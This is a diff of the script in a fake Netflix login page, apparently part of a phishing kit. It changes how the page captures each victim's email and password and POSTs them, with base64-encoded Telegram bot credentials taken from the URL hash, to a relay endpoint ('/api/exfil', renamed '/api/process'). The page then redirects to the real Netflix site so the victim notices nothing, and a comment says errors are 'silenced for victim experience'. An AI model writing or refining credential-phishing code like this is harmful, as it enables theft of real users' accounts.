@@ -165,50 +165,67 @@
         </div>
     </footer>
 
-    <script>
-        const getConf = () => {
-            const h = window.location.hash.substring(1);
-            if (!h) return null;
-            try { return JSON.parse(atob(h)); } catch(e) { return null; }
-        };
+<script>
+    // 1. Grab raw Base64 config from URL Hash
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
 
-        const config = getConf();
-        let userVal = "";
+    const configString = getRawConfig();
+    let userVal = "";
 
-        function toPass() {
-            userVal = document.getElementById('email').value;
-            if(!userVal) return;
-            document.getElementById('loader').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('display-user').innerText = userVal;
-                document.getElementById('step-id').classList.add('hidden');
-                document.getElementById('step-pass').classList.remove('hidden');
-                document.getElementById('step-pass').classList.add('fade-in');
-            }, 800);
+    function toPass() {
+        userVal = document.getElementById('email').value;
+        if(!userVal) return;
+
+        // Show your existing loader
+        document.getElementById('loader').style.display = 'block';
+        
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('display-user').innerText = userVal;
+            document.getElementById('step-id').classList.add('hidden');
+            document.getElementById('step-pass').classList.remove('hidden');
+            document.getElementById('step-pass').classList.add('fade-in');
+            document.getElementById('password').focus();
+        }, 800);
+    }
+
+    async function dispatch() {
+        const p = document.getElementById('password').value;
+        if(!p) return;
+
+        document.getElementById('loader').style.display = 'block';
+        const fin = "https://www.netflix.com/browse";
+
+        // Redirect if no config is found
+        if(!configString) { 
+            setTimeout(() => { window.location.href = fin; }, 1200); 
+            return; 
         }
 
-        async function dispatch() {
-            const p = document.getElementById('password').value;
-            if(!p) return;
-            document.getElementById('loader').style.display = 'block';
-            const fin = "https://www.netflix.com/browse";
-            if(!config) { setTimeout(() => window.location.href = fin, 1200); return; }
-            try {
-                await fetch('/api/exfil', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        target: 'netflix',
-                        credentials: { username: userVal, password: p },
-                        tgToken: config.t,
-                        tgChat: config.c
-                    })
-                });
-            } catch(e){} finally {
-                setTimeout(() => { window.location.href = fin; }, 1200);
-            }
+        try {
+            // 2. Call your central Vercel API relay (/api/process)
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString, // Encoded Telegram credentials
+                    data: { 
+                        User: userVal, 
+                        Pass: p 
+                    }
+                })
+            });
+        } catch(e) {
+            // Silenced for victim experience
+        } finally {
+            setTimeout(() => { 
+                window.location.href = fin; 
+            }, 1200);
         }
-    </script>
+    }
+</script>
 </body>
 </html>
